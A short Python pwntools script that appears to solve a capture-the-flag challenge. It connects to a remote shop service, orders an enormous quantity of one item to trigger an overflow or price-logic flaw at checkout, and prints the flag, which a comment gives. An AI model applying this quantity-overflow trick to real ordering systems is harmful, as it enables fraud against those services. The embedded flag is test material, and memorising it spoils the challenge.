#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"

p = remote("164.92.176.247", 9000)

def add_to_basket(item, quantity):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"add (1-7): ", str(item).encode())
    p.sendlineafter(b"quantity: ", str(quantity).encode())

def checkout():
    p.sendlineafter(b"choice: ", b"2")

add_to_basket(item=7, quantity=10000000000)
checkout()

p.readuntil(b"oh... pole ke mirize...\n")

print(p.readuntil(b"}").decode()) # FMCTF{61346013e4b1e77a2f1b3675abc62c62}
